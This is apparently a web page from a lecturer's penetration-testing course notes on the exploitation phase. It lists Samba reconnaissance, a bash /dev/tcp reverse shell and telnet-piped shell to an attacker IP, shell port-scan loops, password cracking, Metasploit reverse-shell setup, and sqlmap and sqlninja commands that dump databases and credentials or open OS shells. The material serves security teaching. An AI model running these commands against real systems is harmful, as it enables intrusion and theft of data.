<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="Vitaly Ford smart grid security research">
    <meta name="author" content="Vitaly Ford">
    <link rel="icon" href="../../../favicon.ico">

    <title>Vitaly Ford's Personal Website</title>

    <!-- Bootstrap core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <link href="../css/ie10-viewport-bug-workaround.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="../css/navbar-fixed-top.css" rel="stylesheet">

    <script src="../js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container">
            <div class="navbar-header">
                <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar"
                    aria-expanded="false" aria-controls="navbar">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <p class="navbar-brand" href="#">Vitaly Ford</p>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
                <ul class="nav navbar-nav">
                    <li><a href="../index.html">Home</a></li>
                    <li><a href="../research.html">Research</a></li>
                    <li><a href="../publications.html">Publications</a></li>
                    <li><a href="../docs/VitalyFordResume.pdf" target="_blank" rel="noopener norefferer">Resume</a></li>
                    <li><a href="../schedule.html">Schedule</a></li>
                    <li><a href="../contact.html">Contact</a></li>
                    <li class="dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
                            aria-expanded="false">My Talks<span class="caret"></span></a>
                        <ul class="dropdown-menu">
                            <li><a href="../docs/obscurity-in-cybersecurity.pdf" target="_blank" rel="noopener norefferer">Obscurity
                                    in Cybersecurity</a></li>
                            <li><a href="../docs/aws.pdf" target="_blank" rel="noopener norefferer">Cloud (AWS)
                                    Workshop</a></li>
                        </ul>
                    </li>
                    <li><a href="../et.html">Meet</a></li>
                    <li class="dropdown">
                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true"
                            aria-expanded="false">Pentest <span class="caret"></span></a>
                        <ul class="dropdown-menu">
                            <li><a href="00-Background.html">00 Background</a></li>
                            <li><a href="01-Social-Engineering.html">01 Social Engineering</a></li>
                            <li><a href="02-Assessment-Planning.html">02 Assessment Planning</a></li>
                            <li><a href="03-Passive-Intelligence-Gathering.html">03 Passive Intelligence Gathering</a></li>
                            <li><a href="04-Active-Intelligence-Gathering.html">04 Active Intelligence Gathering</a></li>
                            <li class="active"><a href="05-Exploitation.html">05 Exploitation</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
            <!--/.nav-collapse -->
        </div>
    </nav>

    <div class="container">

        <!-- Main component for a primary marketing message or call to action -->
        <div class="normal-text style-2901">
            <h2><code> &gt;&gt; Practical Security Assessment (Penetration Testing) - Exploitation</code></h2>
            <p>The goal of exploitation is to expose data that can be leaked and show how the overall organization can
                be damaged if vulnerabilities are not mitigated. A possibility of planting a backdoor and using a
                machine in a botnet would be a good reason for the organization to listen to you.</p>
            <h1 id="samba">Samba</h1>
            <p>If you see a port 139/TCP being open, do some samba recon and figure out what version is running.
                <code>-L</code> parameter connects to the following IP.
                <code>-N</code> parameter tells that we do not have the root password.</p>
<pre><code class="language-sh">$ nmblookup -A IP_TARGET
$ smbclient -L IP_TARGET -N
$ smbclient -L //SHARE_NAME -I IP_TARGET</code></pre>
            <p>Interactive shell</p>
<pre><code class="language-sh">$ /bin/sh -i</code></pre>
            <h1 id="exploit-search">Exploit Search</h1>
            <p>Navigate to <a href="https://www.exploit-db.com">https://www.exploit-db.com</a> and search there, or you
                can type these commands in Kali:</p>
<pre><code class="language-sh">$ searchsploit NAME
$ searchsploit samba</code></pre>
            <h1 id="a-shell-back-to-you">A shell back to you</h1>
            <p>Set up NetCat on your box that will be listening on port 5757: <code>$ nc -l -p 5757 -vv</code>
                Call a command on the target: <code>$ /bin/bash -i &gt; /dev/tcp/YOUR_ATTACKER_IP/5757 0&lt;&amp;1
                    2&gt;&amp;1</code></p>
            <h1 id="magic-port-scan-and-shell">Magic Port Scan and Shell</h1>
            <p>Assuming that you are on the machine you have compromised, you can do the following to perform a port
                scan of any IP you want:</p>
<pre><code class="language-sh">$ port=1; while [ $port -lt 1024 ]; do echo &gt; /dev/tcp/IP_ANOTHER_TARGET/$port; [ $? == 0 ] &amp;&amp; echo $port &quot;is open&quot; &gt;&gt; /tmp/ports.txt; port=`expr $port + 1`; done</code></pre>
            <p>Similarly, you can do this:</p>
<pre><code class="language-sh">$ for ((i=0; $i &lt; 65535; i++)); do echo &gt; /dev/tcp/IP/$i &amp;&amp; echo $i open; done 2&gt;/dev/null</code></pre>
            <p>More old school stuff for communicating with the box over telnet:</p>
<pre><code class="language-sh">$ telnet attacker_IP PORT1 | /bin/bash | telnet attacker_IP PORT2</code></pre>
            <h1 id="password-brute-forcing">Password Brute-Forcing</h1>
            <p>John The Ripper:</p>
<pre><code class="language-sh">$ john --wordlist=rockyou.txt --rules=Jumbo hashes.txt</code></pre>
            <p>HashCat (probably the best one to-date) which you can learn about <a href="https://hashcat.net/wiki/doku.php?id=hashcat">on
                    their wiki</a>:</p>
<pre><code class="language-sh">
  Attack-          | Hash- |
  Mode             | Type  | Example command
 ==================+=======+==================================================================
  Wordlist         | SHA1  | hashcat -a 0 -m 100 exampleSha1.hash example.dict
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 exampleMd5.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 exampleMd5.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 exampleMd5.hash example.dict example.dict</code></pre>
            <h1 id="metasploit">Metasploit</h1>
            <h3 id="learn-metasploit">Learn Metasploit</h3>
            <ul>
                <li>securitytube.net --&gt; megaprimers --&gt; metasploit framework expert</li>
                <li><a href="http://opensecuritytraining.info/">opensecuritytraining.info</a></li>
                <li><a href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit-unleashed</a></li>
                <li><a href="https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf">Metasploit
                        cheat-sheet</a></li>
                <li><a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/">Meterpreter
                        basics</a></li>
            </ul>
            <h3 id="setting-up-metasploit">Setting up Metasploit</h3>
            <p>First, let&apos;s set up the database:</p>
<pre><code class="language-sh">$ service postgresql start
$ msfdb init</code></pre>
            <p>Now we can open metasploit, type: <code>msfconsole</code>
                We can create our own workspace for future use: <code>workspace -a PentestClass</code>
                Then, type <code>workspace PentestClass</code> to use the workspace. It will allow us to store all the
                details of the pentest in one space that can be used to refer to later on.
                You can do nmap scan within Metasploit:</p>
<pre><code class="language-sh">msf&gt; db_nmap -sS -sV -sC IP_TARGET</code></pre>
            <p>You can type commands like <code>hosts</code> and <code>services</code> to see the results in a nice
                format.
                You can search for exploits inside of Metasploit: <code>search samba</code>
                To use a certain exploit, type <code>use</code> with the full path to the exploit after seraching for
                it:</p>
<pre><code class="language-sh">msf&gt; use exploit/linux/service_name/exploit_name</code></pre>
            <p>Type <code>info</code> to see the information about the exploit.
                Type <code>show options</code> to see what options you need to set for the exploit to be initiated.
                <code>RHOST</code> is the remote host, the IP of the TARGET.
                Type <code>set RHOST IP_TARGET</code>.
                Now we also need to set a payload that will be sent across the wire from us to the TARGET. When the
                TARGET is compromised by the exploit, it will use the payload to connect back to us -- a so-called
                &quot;reverse shell&quot;.
                Type <code>show payloads</code> to see all available payloads.
                Type <code>set payload linux/x86/shell/reverse_tcp</code>
                <code>LHOST</code> is the IP of our Kali box, this is the IP where the TARGET will connect back when it
                is compromised.
                <code>LPORT</code> the port of our Kali box to which the TARGET will try to connect.
                Now we are rady to exploit, type <code>exploit</code></p>
            <h1 id="web-pentest">Web Pentest</h1>
            <p>Load balancing detection: <code>lbd website.com</code>
                Detecting web application firewalls: <code>wafw00f website.com</code>
                Use BeEF, Nikto, w3af, Vega, BurpSuite (free version is slow, paid is a few hundreds $$) or OWASP ZAP
                Proxy to do the pentest for the website.</p>
            <h1 id="xss-attacks">XSS Attacks</h1>
            <ul>
                <li><a href="https://excess-xss.com/">Excess XSS</a> - a comprehensive tutorial on cross-site scripting</li>
                <li><a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Ultimate
                        XSS Polyglot</a> - a universal XSS line that will work almost everywhere</li>
                <li><a href="http://www.xss-payloads.com/">XSS payloads</a></li>
                <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection">XSS
                        injections for all kinds of cases</a></li>
                <li><a href="https://www.reddit.com/r/xss">Reddit Crowdsourcing for XSS</a></li>
            </ul>
            <h1 id="automated-sql-attacks">Automated SQL Attacks</h1>
            <h3 id="sqlmap-py">sqlmap.py</h3>
            <p>Sqlpmap is an automatic SQL injection and database takeover tool written in python.</p>
<pre><code class="language-python">sqlmap --wizard # will help to learn from scratch
sqlmap -u &quot;http://...?id=5&quot; -b # grab the banner
sqlmap -u &quot;http://...?id=5&quot; --current-user
sqlmap -u &quot;http://...?id=5&quot; --curent-db # current database
sqlmap -u &quot;http://...?id=5&quot; -dbs # all databases
sqlmap -u &quot;http://...?id=5&quot; -D DBname --tables # tables for DBname
sqlmap -u &quot;http://...?id=5&quot; -D DBname -T TableName --columns # columns for table TableName
sqlmap -u &quot;http://...?id=5&quot; -D DBname -T TableName --columns --dump # dump all the data
sqlmap -u &quot;http://...?id=5&quot; --users --passwords
sqlmap -u &quot;http://...?id=5&quot; --dbms=[database_type] # run against specific database type
sqlmap -u &quot;http://...&quot; --data=&quot;id=5&quot; --os-shell # will give you a shell</code></pre>
            <h3 id="sqlninja">sqlninja</h3>
            <p>Sqlninja is an SQL Server injection &amp; takeover tool. Here are some of the parameters you can set:</p>
<pre><code class="language-conf">host = target_ip
page = vulnerable_page
stringstart = id=2
lhost = our_attack_machine_ip
device = eth0
msfpath = path_to_metasploit
resolvedip = our_attack_machine_ip</code></pre>
            <p>Test fingerprint:</p>
<pre><code class="language-sh">sqlninja -m t -f sqlninja.app.conf -d 1</code></pre>
            <p>Real fingerprint:</p>
<pre><code class="language-sh">sqlninja -m f -f sqlninja.app.conf -d 1</code></pre>
            <p>Resurrect xp_cmdshell:</p>
            <pre><code class="language-sh">sqlninja -m x -f sqlninja.app.conf -d 1</code></pre>
            <p>Upload netcat:</p>
<pre><code class="language-sh">sqlninja -m u -f sqlninja.app.conf -d 1</code></pre>
            <p>Get interactive shell:</p>
<pre><code class="language-sh">sqlninja -m s -f sqlninja.app.conf -d 1</code></pre>
            <h1 id="xxe-attacks">XXE Attacks</h1>
            <p>External XML Entity Injection (XXE) is a powerful method to exploit XML. <a href="https://blog.zsec.uk/out-of-band-xxe-2/">Example
                    is here</a>.</p>
        </div>

    </div> <!-- /container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script>
        window.jQuery || document.write('<script src="../js/jquery.min.js"><\/script>')
    </script>
    <script src="../js/bootstrap.min.js"></script>
    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../js/ie10-viewport-bug-workaround.js"></script>
</body>

</html>
